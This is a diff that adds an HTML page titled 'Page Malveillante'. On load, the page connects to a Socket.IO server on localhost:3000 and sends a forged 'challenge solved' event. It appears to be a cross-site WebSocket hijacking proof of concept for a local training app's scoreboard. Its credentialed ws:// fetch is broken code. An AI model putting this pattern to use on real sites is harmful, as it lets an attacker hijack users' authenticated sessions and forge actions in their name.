@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page Malveillante</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
+
+</head>
+<body>
+    
+     <div id="result"></div>
+     
+     <script>
+          function solveChallenge(){
+            try {
+                // Use Socket.IO client library for easier connection
+                const socket = io('http://localhost:3000');
+                
+                socket.on('connect', function() {
+                    console.log('Socket.IO connected!');
+                    document.getElementById('result').innerHTML = 'Connected to Socket.IO';
+                    
+                    // Emit the challenge solved event
+                    socket.emit('challenge solved', {key: 'scoreBoardChallenge'});
+                    
+                    console.log('Challenge solved event sent!');
+                    document.getElementById('result').innerHTML += '<br>Challenge solved event sent!';
+                });
+                
+                socket.on('disconnect', function() {
+                    console.log('Socket.IO disconnected');
+                    document.getElementById('result').innerHTML += '<br>Socket.IO disconnected';
+                });
+                
+                socket.on('error', function(error) {
+                    console.error('Socket.IO error:', error);
+                    document.getElementById('result').innerHTML = 'Socket.IO error: ' + error;
+                });
+                
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('result').innerHTML = 'Error: ' + error.message;
+            }
+          }
+
+          fetch("ws://localhost:3000/socket.io/?EIO=4&transport=websocket&sid=XgcFfwYOfpA5QboLAAAW", {
+            "credentials": "include",
+            "headers": {
+                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0",
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Sec-WebSocket-Version": "13",
+                "Sec-WebSocket-Extensions": "permessage-deflate",
+                "Sec-WebSocket-Key": "T0axBBv4NU7jIdXt9wSBtw==",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "websocket",
+                "Sec-Fetch-Site": "same-origin",
+                "Pragma": "no-cache",
+                "Cache-Control": "no-cache"
+            },
+            "method": "GET",
+            "mode": "cors"
+        }).then(response => {
+            console.log("Fetch response:", response);
+            document.getElementById('result').innerHTML = 'Fetch response status: ' + response.status;
+        }).catch(error => {
+            console.error("Fetch error:", error);
+            document.getElementById('result').innerHTML = 'Fetch error: ' + error.message;
+        });
+          
+          window.onload = function() {
+                solveChallenge();
+          };
+     </script>
+</body>
+</html>
